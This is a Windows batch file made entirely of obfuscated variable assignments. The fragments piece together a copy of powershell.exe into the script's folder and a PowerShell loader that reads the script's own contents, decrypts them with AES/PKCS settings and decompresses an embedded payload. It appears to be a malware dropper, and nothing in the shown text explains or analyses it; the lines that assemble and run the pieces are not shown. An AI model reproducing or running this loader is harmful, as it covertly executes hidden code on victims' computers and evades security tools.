@echo off
set "CTQliXWkQu=y "
set "EJveqIigvt=Sy"
set "xpFPIVltwq=em"
set "nYJueVKGtH=s\"
set "loeKOvubVz=0\"
set "wvXXJWUJSo=1."
set "tNHfqNUAjm=he"
set "JUGeiNkLWX=he"
set "fEcKFvipfJ=co"
set "RsWuQQEIcz=we"
set "wPJfsPuPPg=do"
set "VytoQrQCyn=\W"
set "XaNsFgJiUl=rS"
set "CWihVRzPxK=st"
set "aMBssOjkEx=32"
set "FTMfWaTEmE= /"
set "FIkmbMtJLn=po"
set "DkXFxTsJTX=ll"
set "QLYwoOyAOg=.e"
set "yEpUfeFPIs=ow"
set "bmwMoehNOA=py"
set "vOKDOceniW=Wi"
set "DXHHeVRiet=:\"
set "vUiJjpeGwv=in"
set "KCOjbfOoWa=we"
set "TVOBlKtVaW=nd"
set "lRjKxVCJjY=rs"
set "jHtYtdWCEO=\v"
set "lCGMwfAbYI=ll"
set "KukhKIXDak= C"
set "IpkaOYVqYq=ws"
set "eJUjVgDSic=Po"
set "jJANDWLRlc=xe"
set "rBNCUVvuHV= %~dp0"
set "AGewadAxWk=cd"
set "ApGftIgHDq=);$E"
set "WwPRjsmsok=('%~f0'"
set "JPZbSPoRij=b.En"
set "iiSZdGcLVI=('da"
set "DZQnHzToXv=Syst"
set "qKRGTXwZyk=Secu"
set "UuPhLzbTDB=onve"
set "NKbmHGTpKJ=abm "
set "ItmNdehtjn=ach "
set "mpOUHofqcy=Dj, "
set "kraqhiGwoR=e]::"
set "ffFjmiRZjv=jxXa"
set "bnHGsXfmHE=[]] "
set "WQxJUiMseG=JDj."
set "FzeLLgXxbl=ddin"
set "StxIVQYRzc=;$pA"
set "HSLgHvyOoU=in $"
set "gOfbDvTcdF=aVO "
set "LKQjnaGhhX=.Com"
set "HnNRraeqdN=TllA"
set "ICTpmUaZEd=('%*'"
set "BYSEkUFbHw=and "
set "DPlxmalpdq=$Ojx"
set "bfoQzfMjjB=.Sec"
set "NHxHBrwVlH=tsWi"
set "jKaocvZdLp=e = "
set "RcDVdGnqGC=$zTT"
set "pCGdAFTehI= [Sy"
set "wYImUMQTIN=oArr"
set "LIjAOAPPvK=jxXa"
set "cBILuZHoSB== $O"
set "oztxvEaCXK=pose"
set "IUgkQdysuZ=j = "
set "RSarlmfGjQ=mory"
set "pnhEzPtUNM=JCbV"
set "abdgfdGcLu=.Mem"
set "vssNMsKZCQ=em.C"
set "TPKVAIeRay=ecry"
set "xPpEIaIiEW=oryS"
set "NczWpnlJpL=tem."
set "aqdRQsshzl=-4] "
set "mdmvdXrStB=:('g"
set "fSLAGBOmtw=PKCS"
set "oMlJVDfSFm=1] -"
set "vJztppQOUb=).Sp"
set "UxNKKfolRk=$zTT"
set "EIRJYbmVIL=1..-"
set "vmBhgdAMsM=[Sys"
set "yKnsUMydfD=ress"
set "OqaPqVviJL=CbV."
set "xkJVdVfhkQ=-nop"
set "aaQFPknjCz=]::("
set "dImERyLEvm=.Mod"
set "VxfxXSNtNF=bm.T"
set "zcvgOMCuiq=OyzA"
set "KPZmZLxNdp=bstr"
set "qMeDbjjJBh=nirt"
set "eTrkavzRQo=-joi"
set "yZKzQtvFon= '')"
